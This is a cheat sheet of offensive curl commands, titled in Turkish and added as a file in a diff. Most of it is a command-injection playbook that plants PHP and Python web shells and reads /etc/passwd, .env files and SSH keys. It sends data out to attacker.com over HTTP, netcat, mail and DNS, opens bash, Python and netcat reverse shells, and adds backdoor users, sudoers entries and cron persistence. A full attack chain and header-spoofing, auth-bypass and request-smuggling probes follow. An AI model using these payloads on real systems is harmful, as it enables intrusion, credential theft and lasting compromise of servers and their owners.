@@ -1,0 +1,886 @@
+CURL KOMUTLARI 
+
+1. BASIC FILE OPERATIONS
+📝 Write Test File to Web Root
+# Linux/Apache
+curl -X POST "https://example.com/api/v1/files" \
+  -d "filename=test.txt; echo VULNERABLE_TEST_12345 > /var/www/html/testfile.txt"
+
+# Verify
+curl "https://example.com/testfile.txt"
+
+# Linux/Nginx
+curl -X POST "https://example.com/api" \
+  -d "cmd=id; echo SUCCESS_$(date +%s) > /usr/share/nginx/html/proof.txt"
+
+# Verify
+curl "https://example.com/proof.txt"
+
+# Windows/IIS
+curl -X POST "https://example.com/api" \
+  -d "cmd=whoami & echo PWNED > C:\inetpub\wwwroot\test.txt"
+
+# Verify
+curl "https://example.com/test.txt"
+
+
+📂 List Directory Contents
+# List current directory
+curl "https://example.com/search?q=test; ls -la > /var/www/html/dirlist.txt"
+curl "https://example.com//dirlist.txt"
+
+# List web root
+curl "https://example.com/api" \
+  -d "file=x; ls -la /var/www/html/ > /var/www/html/files.txt"
+curl "https://example.com/files.txt"
+
+# List /etc
+curl "https://example.com/page?param=x; ls -la /etc > /tmp/etc_list.txt"
+# Access via LFI or upload dir
+curl "https://example.com/uploads/../../../tmp/etc_list.txt"
+
+📄 Read Sensitive Files
+# Read /etc/passwd
+curl "https://example.com/api" \
+  -d "cmd=id; cat /etc/passwd > /var/www/html/passwd.txt"
+curl "https://example.com/passwd.txt"
+
+# Read config files
+curl "https://example.com/search?q=x; cat /var/www/html/config.php > /var/www/html/cfg.txt"
+curl "https://example.com/cfg.txt"
+
+# Read .env file
+curl "https://example.com//api" \
+  -d "file=test; cat /var/www/html/.env > /var/www/html/env.txt"
+curl "https://example.com//env.txt"
+
+# Read SSH keys
+curl "https://example.com/page" \
+  -d "param=x; cat /root/.ssh/id_rsa > /var/www/html/key.txt"
+curl "https://example.com/key.txt"
+
+2. WEB SHELL CREATION
+🐚 Simple PHP Web Shell
+# Method 1: Echo to file
+curl -X POST "https://example.com/api" \
+  -d "cmd=id; echo '<?php system(\$_GET[\"c\"]); ?>' > /var/www/html/shell.php"
+
+# Use it
+curl "https://example.com/shell.php?c=whoami"
+curl "https://example.com/shell.php?c=cat /etc/passwd"
+curl "https://example.com/shell.php?c=ls -la"
+
+# Method 2: Base64 encoded
+curl -X POST "https://c/api" \
+  -d "cmd=x; echo 'PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg==' | base64 -d > /var/www/html/s.php"
+
+curl "https://example.com//s.php?c=id"
+
+🔥 Advanced PHP Web Shell
+
+  # Full-featured shell
+curl -X POST "https://example.com/upload" \
+  -d "file=x; cat > /var/www/html/sh.php <<'EOF'
+<?php
+if(isset(\$_GET['c'])){
+    \$output = shell_exec(\$_GET['c']);
+    echo '<pre>'.\$output.'</pre>';
+}
+if(isset(\$_FILES['f'])){
+    move_uploaded_file(\$_FILES['f']['tmp_name'], \$_FILES['f']['name']);
+}
+?>
+EOF"
+
+# Use it
+curl "https://example.com/sh.php?c=whoami"
+curl "https://example.com/sh.php?c=uname -a"
+
+🐍 Python Web Shell
+
+# Create Python CGI shell
+curl -X POST "https://example.com/api" \
+  -d "cmd=x; cat > /var/www/html/shell.py <<'EOF'
+#!/usr/bin/env python3
+import cgi, subprocess, sys
+print('Content-Type: text/html\n')
+form = cgi.FieldStorage()
+cmd = form.getvalue('c', 'id')
+out = subprocess.check_output(cmd, shell=True)
+print(out.decode())
+EOF"
+
+# Make executable
+curl "https://example.com/api" \
+  -d "cmd=chmod +x /var/www/html/shell.py"
+
+# Use it
+curl "https://example.com/shell.py?c=whoami"
+
+3. DATA EXFILTRATION
+📤 Exfiltrate to Attacker Server
+
+# Method 1: curl POST
+curl -X POST "https://example.com/api" \
+  -d "cmd=id; curl -X POST -d \"\$(cat /etc/passwd)\" http://attacker.com/collect"
+
+# Method 2: curl GET (URL encoded)
+curl "https://example.com/search?q=x; curl http://attacker.com/?\$(cat /etc/passwd | base64 -w0)"
+
+# Method 3: wget
+curl "https://example.com/page" \
+  -d "param=x; cat /etc/passwd | wget --post-data=\$(cat) http://attacker.com/collect"
+
+# Method 4: nc (netcat)
+curl "https://example.com/api" \
+  -d "file=x; cat /etc/passwd | nc attacker.com 4444"
+
+📨 Email Exfiltration
+# Send via mail command
+curl "https://example.com/api" \
+  -d "cmd=x; cat /etc/passwd | mail -s 'Data' attacker@evil.com"
+
+# Send via sendmail
+curl "https://example.com/page" \
+  -d "param=x; cat /var/www/html/.env | sendmail attacker@evil.com"
+
+💾 Store in Temporary Location
+
+# Copy to /tmp
+curl "https://example.com/api" \
+  -d "cmd=id; cp /etc/passwd /tmp/p.txt; chmod 777 /tmp/p.txt"
+
+# Access via /proc
+curl "https://example.com/api" \
+  -d "file=x; cat /etc/passwd > /proc/self/fd/1"
+
+# Store in /dev/shm (RAM disk)
+curl "https://example.com/search?q=x; cat /etc/shadow > /dev/shm/s.txt"
+
+4. REVERSE SHELLS
+🔌 Bash Reverse Shell
+
+# Method 1: Standard bash
+curl -X POST "https://example.com/api" \
+  -d "cmd=id; bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"
+
+# Method 2: Encoded
+curl "https://example.com/search" \
+  -d "q=x; echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx' | base64 -d | bash"
+
+# Method 3: Via file
+curl "https://example.com/api" \
+  -d "file=x; echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' > /tmp/rev.sh; bash /tmp/rev.sh"
+
+🐍 Python Reverse Shell
+# Python one-liner
+curl "https://example.com/page" \
+  -d "param=x; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'"
+
+# Python3 version
+curl "https://example.com/api" \
+  -d "cmd=id; python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"attacker.com\",4444));subprocess.call([\"/bin/bash\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"
+
+🖥️ Netcat Reverse Shell
+
+# Traditional nc
+curl "https://example.com/api" \
+  -d "file=x; nc -e /bin/bash attacker.com 4444"
+
+# nc without -e
+curl "https://example.com/page" \
+  -d "param=x; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc attacker.com 4444 >/tmp/f"
+
+# ncat with SSL
+curl "https://example.com/api" \
+  -d "cmd=id; ncat --ssl attacker.com 4444 -e /bin/bash"
+
+5. BLIND COMMAND INJECTION
+⏱️ Time-Based Detection
+
+# Test with sleep
+curl "https://example.com/api?file=test; sleep 10"
+# If response takes 10+ seconds = VULNERABLE
+
+# Test with ping
+curl "https://example.com/search?q=x; ping -c 10 127.0.0.1"
+# 10 second delay = VULNERABLE
+
+# Conditional sleep (file exists)
+curl "https://example.com/page" \
+  -d "param=x; [ -f /etc/passwd ] && sleep 5"
+# 5 second delay = file exists
+
+📡 Out-of-Band Detection
+
+# HTTP callback
+curl "https://example.com/api" \
+  -d "cmd=id; curl http://attacker.com/$(whoami)"
+
+# DNS callback
+curl "https://example.com/search?q=x; nslookup \$(whoami).attacker.com"
+
+# Ping callback
+curl "https://example.com/page" \
+  -d "param=x; ping -c 1 \$(hostname).attacker.com"
+
+💾 Disk-Based Detection
+
+# Create marker file
+curl "https://example.com/api" \
+  -d "file=x; touch /tmp/VULNERABLE_$(date +%s)"
+
+# Then check if exists
+curl "https://example.com/api" \
+  -d "file=x; [ -f /tmp/VULNERABLE_* ] && curl http://attacker.com/found"
+
+
+6. DNS EXFILTRATION
+🔍 DNS Data Exfiltration
+
+# Exfiltrate /etc/passwd via DNS
+curl "https://example.com/api" \
+  -d "cmd=id; cat /etc/passwd | while read line; do nslookup \$line.attacker.com; done"
+
+# Exfiltrate base64 encoded
+curl "https://example.com/search" \
+  -d "q=x; cat /etc/passwd | base64 -w0 | fold -w 63 | while read line; do nslookup \$line.attacker.com; done"
+
+# Exfiltrate specific data
+curl "https://example.com/page" \
+  -d "param=x; DB_PASS=\$(grep DB_PASSWORD /var/www/html/.env | cut -d= -f2); nslookup \$DB_PASS.attacker.com"
+
+# Exfiltrate hostname
+curl "https://example.com/api" \
+  -d "file=x; H=\$(hostname); nslookup \$H.attacker.com"
+
+# Exfiltrate user
+curl "https://example.com/search?q=x; U=\$(whoami); nslookup \$U.attacker.com"
+
+7. TIME-BASED DETECTION
+⏰ Various Time Delays
+
+# Sleep command
+curl "https://example.com/api?cmd=test; sleep 5"
+
+# Ping delay
+curl "https://example.com/search?q=x | ping -c 5 127.0.0.1"
+
+# Heavy computation
+curl "https://example.com/page" \
+  -d "param=x; for i in {1..1000000}; do echo \$i; done > /dev/null"
+
+# Read large file
+curl "https://example.com/api" \
+  -d "file=x; cat /dev/zero | head -c 100000000 > /dev/null"
+
+🧪 Boolean-Based Blind
+
+# If file exists, sleep 5
+curl "https://example.com/api" \
+  -d "cmd=x; [ -f /etc/passwd ] && sleep 5 || sleep 0"
+# 5s delay = file exists
+
+# If user is root, sleep 5
+curl "https://example.com/search?q=x; [ \$(whoami) = 'root' ] && sleep 5"
+# 5s delay = running as root
+
+# Check MySQL running
+curl "https://example.com/page" \
+  -d "param=x; [ -f /var/run/mysqld/mysqld.pid ] && sleep 5"
+
+8. WAF BYPASS TECHNIQUES
+🛡️ Character Encoding
+
+# URL encoding
+curl "https://example.com/api?cmd=%3Bid%3B%20cat%20%2Fetc%2Fpasswd"
+
+# Double URL encoding
+curl "https://example.com/api?cmd=%253Bid%253B%2520cat%2520%252Fetc%252Fpasswd"
+
+# Unicode encoding
+curl "https://example.com/api" \
+  -d "cmd=\u003b\u0069\u0064"
+
+# Hex encoding
+curl "https://example.com/api" \
+  -d "cmd=\x3b\x69\x64"
+
+🎭 Variable Manipulation
+# IFS (Internal Field Separator)
+curl "https://example.com/api?cmd=cat\${IFS}/etc/passwd"
+
+# Empty variables
+curl "https://example.com/search?q=c\${x}at\${x}/etc/passwd"
+
+# Using $@
+curl "https://example.com/page" \
+  -d "param=cat\$@/etc/passwd"
+
+# Using $*
+curl "https://example.com/api?cmd=c\$*at /etc/passwd"
+
+🔤 Case Manipulation
+# Mixed case
+curl "https://example.com/api?cmd=CaT /etc/passwd"
+
+# Full uppercase
+curl "https://example.com/search?q=CAT /ETC/PASSWD"
+
+# Alternating
+curl "https://example.com/page" \
+  -d "param=cAt /EtC/pAsSwD"
+
+📦 Command Wrapping
+# Backticks
+curl "https://example.com/api?cmd=\`cat /etc/passwd\`"
+
+# Command substitution
+curl "https://example.com/search?q=\$(cat /etc/passwd)"
+
+# Via echo
+curl "https://example.com/page" \
+  -d "param=\$(echo cat /etc/passwd | bash)"
+
+# Via printf
+curl "https://example.com/api" \
+  -d "cmd=\$(printf 'cat /etc/passwd' | bash)"
+
+🎨 Obfuscation
+# Base64
+curl "https://example.com/api" \
+  -d "cmd=echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | bash"
+
+# Hex
+curl "https://example.com/search" \
+  -d "q=\$(echo -e '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')"
+
+# Octal
+curl "https://example.com/page" \
+  -d "param=\$(printf \"\\\143\\\141\\\164\\\40\\\57\\\145\\\164\\\143\\\57\\\160\\\141\\\163\\\163\\\167\\\144\")"
+
+
+9. PRIVILEGE ESCALATION
+👑 SUID Binary Exploitation
+# Find SUID binaries
+
+curl "https://example.com/api" \
+  -d "cmd=id; find / -perm -4000 2>/dev/null > /var/www/html/suid.txt"
+curl "https://example.com/suid.txt"
+
+# Exploit find SUID
+curl "https://example.com/search" \
+  -d "q=x; find /etc/passwd -exec cat {} \; > /var/www/html/p.txt"
+
+# Exploit vim SUID
+curl "https://example.com/page" \
+  -d "param=x; vim -c ':!cat /etc/shadow > /var/www/html/s.txt' -c ':q!'"
+
+🔐 Sudo Exploitation
+
+# Check sudo rights
+curl "https://example.com/api" \
+  -d "file=x; sudo -l > /var/www/html/sudo.txt"
+curl "https://example.com/sudo.txt"
+
+# If sudo ALL
+curl "https://example.com/search" \
+  -d "q=x; sudo cat /etc/shadow > /var/www/html/shadow.txt"
+
+📝 Cron Job Hijacking
+
+# List cron jobs
+curl "https://example.com/api" \
+  -d "cmd=id; cat /etc/crontab > /var/www/html/cron.txt"
+
+# Hijack writable cron script
+curl "https://example.com/page" \
+  -d "param=x; echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> /etc/cron.hourly/backup.sh"
+
+10. PERSISTENCE
+🔄 Backdoor Installation
+
+# Add SSH key
+curl "https://example.com/api" \
+  -d "cmd=id; mkdir -p /root/.ssh; echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys"
+
+# Create hidden backdoor user
+curl "https://example.com/search" \
+  -d "q=x; useradd -m -s /bin/bash .hidden; echo '.hidden:password' | chpasswd"
+
+# Add to sudoers
+curl "https://example.com/page" \
+  -d "param=x; echo '.hidden ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
+
+📌 Persistent Web Shell
+
+# Hidden in legitimate file
+curl "https://example.com/api" \
+  -d "cmd=id; echo '<?php /*' >> /var/www/html/config.php; echo 'if(\$_GET[\"debug\"]) system(\$_GET[\"debug\"]); //*/ ?>' >> /var/www/html/config.php"
+
+# Use it
+curl "https://example.com/config.php?debug=whoami"
+
+# In .htaccess
+curl "https://example.com/upload" \
+  -d "file=x; echo 'AddType application/x-httpd-php .txt' >> /var/www/html/.htaccess"
+
+# Now .txt files execute as PHP
+curl "https://example.com/api" \
+  -d "cmd=id; echo '<?php system(\$_GET[\"c\"]); ?>' > /var/www/html/readme.txt"
+
+🕰️ Cron Persistence
+
+    # Add reverse shell to crontab
+curl "https://example.com/api" \
+  -d "cmd=id; (crontab -l; echo '*/10 * * * * bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"') | crontab -"
+
+# Verify
+curl "https://example.com/search" \
+  -d "q=x; crontab -l > /var/www/html/mycron.txt"
+curl "https://example.com/mycron.txt"
+
+🎯 COMPLETE ATTACK CHAIN EXAMPLE
+
+Full Exploitation Scenario
+
+# ==================== PHASE 1: DETECTION ====================
+# Test for vulnerability
+curl "https://example.com/api/v1/export" \
+  -H "Cookie: session=YOUR_SESSION" \
+  -d "filename=test.txt; sleep 5"
+# Response takes 5+ seconds? VULNERABLE!
+
+# ==================== PHASE 2: INFORMATION GATHERING =============
+# Detect OS
+curl "https://example.com/api/v1/export" \
+  -H "Cookie: session=YOUR_SESSION" \
+  -d "filename=x; uname -a > /var/www/html/os.txt"
+curl "https://example.com/os.txt"
+
+# Get user
+curl "https://example.com/api/v1/export" \
+  -H "Cookie: session=YOUR_SESSION" \
+  -d "filename=x; whoami > /var/www/html/user.txt"
+curl "https://example.com/user.txt"
+
+# List files
+curl "https://example.com/api/v1/export" \
+  -H "Cookie: session=YOUR_SESSION" \
+  -d "filename=x; ls -la /var/www/html > /var/www/html/files.txt"
+curl "https://example.com/files.txt"
+
+# ==================== PHASE 3: DATA EXFILTRATION ===============
+# Exfiltrate /etc/passwd
+curl "https://example.com/api/v1/export" \
+  -H "Cookie: session=YOUR_SESSION" \
+  -d "filename=x; cat /etc/passwd > /var/www/html/passwd.txt"
+curl "https://example.com/passwd.txt"
+
+# Exfiltrate config
+curl "https://example.com/api/v1/export" \
+  -H "Cookie: session=YOUR_SESSION" \
+  -d "filename=x; cat /var/www/html/config.php > /var/www/html/cfg.txt"
+curl "https://example.com/cfg.txt"
+
+# Exfiltrate .env
+curl "https://example.com/api/v1/export" \
+  -H "Cookie: session=YOUR_SESSION" \
+  -d "filename=x; cat /var/www/html/.env > /var/www/html/environment.txt"
+curl "https://example.com/environment.txt"
+
+# ==================== PHASE 4: WEB SHELL INSTALLATION ==================
+# Create web shell
+curl "https://example.com/api/v1/export" \
+  -H "Cookie: session=YOUR_SESSION" \
+  -d "filename=x; echo '<?php system(\$_GET[\"cmd\"]); ?>' > /var/www/html/shell.php"
+
+# Test web shell
+curl "https://example.com/shell.php?cmd=whoami"
+curl "https://example.com/shell.php?cmd=id"
+curl "https://example.com/shell.php?cmd=uname -a"
+
+# ==================== PHASE 5: PERSISTENCE ==================
+# Add SSH key
+curl "https://example.com/shell.php?cmd=mkdir -p /home/www-data/.ssh"
+curl "https://example.com/shell.php" \
+  --data-urlencode "cmd=echo 'ssh-rsa AAAA... your_key' >> /home/www-data/.ssh/authorized_keys"
+
+# Create backup user
+curl "https://example.com/shell.php" \
+  --data-urlencode "cmd=useradd -m backup -s /bin/bash"
+curl "https://example.com/shell.php" \
+  --data-urlencode "cmd=echo 'backup:P@ssw0rd123' | chpasswd"
+
+# ==================== PHASE 6: PRIVILEGE ESCALATION ===================
+# Check sudo
+curl "https://example.com/shell.php?cmd=sudo -l" > sudo_rights.txt
+
+# Find SUID binaries
+curl "https://example.com/shell.php" \
+  --data-urlencode "cmd=find / -perm -4000 2>/dev/null"
+
+# ==================== PHASE 7: REVERSE SHELL ====================
+# Setup listener on attacker machine
+nc -lvnp 4444
+
+# Execute reverse shell
+curl "https://example.com/shell.php" \
+  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
+
+# ==================== PHASE 8: POST-EXPLOITATION ===================
+# On reverse shell:
+# Download additional tools
+wget http://attacker.com/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+
+# Escalate to root
+# (use found vulnerabilities)
+
+# Dump credentials
+cat /var/www/html/config.php
+grep -r "password" /var/www/html/
+grep -r "api_key" /var/www/html/
+
+# Pivot to internal network
+cat /etc/hosts
+ip route
+netstat -tulpn
+========================================================================
+1️⃣ URL MANIPULATION TECHNIQUES
+Path Fuzzing
+
+# Trailing slash
+curl -I https://example.com/
+
+# Double slash
+curl -I https://example.comm//
+
+# URL encoding
+curl -I https://example.com/%2e/
+
+# Dot segments
+curl -I https://example.comm/./
+curl -I https://example.com/../
+curl -I https://example.com/..;/
+
+# Case variation
+curl -I https://example.com/INDEX
+curl -I https://example.com/InDeX
+
+# Different extensions
+curl -I https://example.com/index.php
+curl -I https://example.com/index.html
+curl -I https://example.com/index.aspx
+curl -I https://example.com/index.jsp
+
+# Add query string
+curl -I https://example.com/?
+curl -I https://example.com/?page=home
+
+2️⃣ HTTP HEADER MANIPULATION
+X-Forwarded Headers
+
+# X-Forwarded-For (internal IP)
+curl https://example.com \
+  -H "X-Forwarded-For: 127.0.0.1"
+
+curl https://example.com \
+  -H "X-Forwarded-For: localhost"
+
+curl https://example.com \
+  -H "X-Forwarded-For: 10.0.0.1"
+
+# X-Originating-IP
+curl https://example.com \
+  -H "X-Originating-IP: 127.0.0.1"
+
+# X-Remote-IP
+curl https://example.com \
+  -H "X-Remote-IP: 127.0.0.1"
+
+# X-Client-IP
+curl https://example.com \
+  -H "X-Client-IP: 127.0.0.1"
+
+# X-Real-IP
+curl https://example.com \
+  -H "X-Real-IP: 127.0.0.1"
+
+# Combine multiple
+curl https://example.com \
+  -H "X-Forwarded-For: 127.0.0.1" \
+  -H "X-Real-IP: 127.0.0.1" \
+  -H "X-Client-IP: 127.0.0.1"
+
+Custom Headers
+
+# X-Original-URL
+curl https://example.com \
+  -H "X-Original-URL: /admin"
+
+# X-Rewrite-URL
+curl https://example.com \
+  -H "X-Rewrite-URL: /admin"
+
+# X-Custom-IP-Authorization
+curl https://example.com \
+  -H "X-Custom-IP-Authorization: 127.0.0.1"
+
+# X-ProxyUser-Ip
+curl https://example.com \
+  -H "X-ProxyUser-Ip: 127.0.0.1"
+
+# Referer
+curl https://example.com \
+  -H "Referer: https://example.com"
+
+curl https://example.com \
+  -H "Referer: https://example.com"
+
+HTTP Method Override
+
+# X-HTTP-Method-Override
+curl https://example.com \
+  -X POST \
+  -H "X-HTTP-Method-Override: GET"
+
+# Try different methods
+curl -X GET https://example.com
+curl -X POST https://example.com
+curl -X PUT https://example.com
+curl -X DELETE https://example.com
+curl -X OPTIONS https://example.com
+curl -X TRACE https://example.com
+curl -X HEAD https://example.com
+curl -X CONNECT https://example.com
+
+3️⃣ SUBDOMAIN & VHOST ENUMERATION
+Subdomain Fuzzing
+
+# Test subdomains
+curl -I https://api.example.com
+curl -I https://admin.example.com
+curl -I https://portal.example.com
+curl -I https://internal.example.com
+curl -I https://dev.example.com
+curl -I https://test.example.com
+curl -I https://example.com
+
+# Host header manipulation
+curl https://example.com \
+  -H "Host: localhost"
+
+curl https://example.com \
+  -H "Host: 127.0.0.1"
+
+curl https://example.com \
+  -H "Host: admin.example.com"
+
+
+4️⃣ AUTHENTICATION BYPASS
+Session/Cookie Manipulation
+
+# Try with various session cookies
+curl https://example.com \
+  -H "Cookie: session=admin"
+
+curl https://example.com \
+  -H "Cookie: auth=true"
+
+curl https://example.com \
+  -H "Cookie: authenticated=1"
+
+curl https://example.com \
+  -H "Cookie: admin=1"
+
+curl https://example.com \
+  -H "Cookie: role=admin"
+
+# Session with internal IP
+curl https://example.com \
+  -H "Cookie: session=123" \
+  -H "X-Forwarded-For: 127.0.0.1"
+
+Authorization Headers
+
+# Basic auth attempts
+curl https://example.com \
+  -H "Authorization: Basic YWRtaW46YWRtaW4="  # admin:admin
+
+# Bearer token
+curl https://example.com \
+  -H "Authorization: Bearer AAAA"
+
+# Custom auth
+curl https://example.com \
+  -H "X-Auth-Token: admin"
+
+curl https://example.com \
+  -H "X-API-Key: admin"
+
+5️⃣ PORT SCANNING & SERVICE DETECTION  
+
+# Nmap comprehensive scan
+nmap -sV -sC -p- example.com
+
+# Common web ports
+nmap -p 80,443,8080,8443,8000,8888,9000,9090 example.com
+
+# All ports
+nmap -p- --min-rate=1000 example.com
+
+# Service detection
+nmap -sV -p 80,443 example.com
+
+# Check for open ports with curl
+curl -I https://example.com:8080
+curl -I https://example.com:8443
+curl -I https://example.com:9000
+curl -I http://example.com:80
+
+6️⃣ DIRECTORY & FILE FUZZING
+Common Files
+
+# Configuration files
+curl -I https://example.com/.git/config
+curl -I https://example.com/.env
+curl -I https://example.com/web.config
+curl -I https://example.com/config.json
+curl -I https://example.com/package.json
+curl -I https://example.com/composer.json
+
+# Backups
+curl -I https://example.com/backup.zip
+curl -I https://example.com/backup.tar.gz
+curl -I https://example.com/site.zip
+curl -I https://example.com/db.sql
+
+# Documentation
+curl -I https://example.com/README.md
+curl -I https://example.com/CHANGELOG.md
+curl -I https://example.comm/docs/
+
+ffuf Fuzzing
+
+# Directory fuzzing
+ffuf -u https://example.com/FUZZ \
+  -w /usr/share/wordlists/dirb/common.txt \
+  -mc 200,301,302,401
+
+# File fuzzing
+ffuf -u https://example.com/FUZZ \
+  -w /usr/share/wordlists/dirb/common.txt \
+  -e .php,.html,.aspx,.jsp,.txt,.json,.xml \
+  -mc 200,301,302,401
+
+# API fuzzing
+ffuf -u https://example.comm/api/FUZZ \
+  -w /usr/share/wordlists/api-endpoints.txt \
+  -mc 200,301,302,401
+
+# With custom headers
+ffuf -u https://example.com/FUZZ \
+  -w /usr/share/wordlists/dirb/common.txt \
+  -H "X-Forwarded-For: 127.0.0.1" \
+  -mc 200,301,302,401
+
+7️⃣ WAF/CDN DETECTION & BYPASS
+Detect WAF
+
+# wafw00f
+wafw00f https://example.com
+
+# Manual detection
+curl -I https://example.com \
+  -H "User-Agent: ' OR 1=1--"
+# WAF varsa block eder
+
+# Check headers for WAF signatures
+curl -I https://example.com | grep -i "cloudflare\|akamai\|imperva"
+
+WAF Bypass Attempts
+
+# User-Agent manipulation
+curl https://example.com \
+  -H "User-Agent: googlebot"
+
+curl https://example.com \
+  -H "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)"
+
+# Origin IP discovery (bypass CDN)
+# Check SecurityTrails, Censys, Shodan for origin IP
+curl -I http://ORIGIN_IP -H "Host: example.com"
+
+# Request smuggling
+curl https://example.com \
+  -H "Transfer-Encoding: chunked" \
+  -d "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n"
+
+8️⃣ CACHE POISONING & DECEPTION
+
+# X-Forwarded-Host
+curl https://example.com \
+  -H "X-Forwarded-Host: evil.com"
+
+# X-Forwarded-Scheme
+curl https://example.com \
+  -H "X-Forwarded-Scheme: http"
+
+# X-Forwarded-Proto
+curl https://example.com \
+  -H "X-Forwarded-Proto: http"
+
+# Host header injection
+curl https://example.com \
+  -H "Host: evil.com"
+
+9️⃣ ADVANCED TECHNIQUES
+
+# Different API versions
+curl -I https://example.com/v1/
+curl -I https://example.com/v2/
+curl -I https://example.com/api/v1/
+curl -I https://example.com/api/v2/
+curl -I https://example.com/rest/
+curl -I https://example.com/restapi/
+
+HTTP/2 Request Smuggling
+
+# Test HTTP/2
+curl --http2 https://example.com
+
+# Downgrade attack
+curl --http1.1 https://example.com
+
+# HTTP/2 specific headers
+curl --http2 https://example.com \
+  -H ":method: GET" \
+  -H ":path: /admin"
+
+🔟 SPECIFIC ATTACKS
+
+# Check for  products
+curl -I https://example.com/example/
+curl -I https://example.com/central/
+curl -I https://example.com/portal/
+
+# Known paths
+curl -I https://example.com/manage/
+curl -I https://example.com/admin/
+curl -I https://example.com/api/
+
+
+API Testing
+
+# Try  API endpoints
+curl https://example.com/api/whoami
+curl https://example.com/api/v1/account
+curl https://example.com/api/v1/users
+curl https://example.com/api/v1/config
+
+# With internal IP header
+curl https://example.com/api/whoami \
+  -H "X-Forwarded-For: 127.0.0.1" \
+  -H "X-Real-IP: 127.0.0.1"
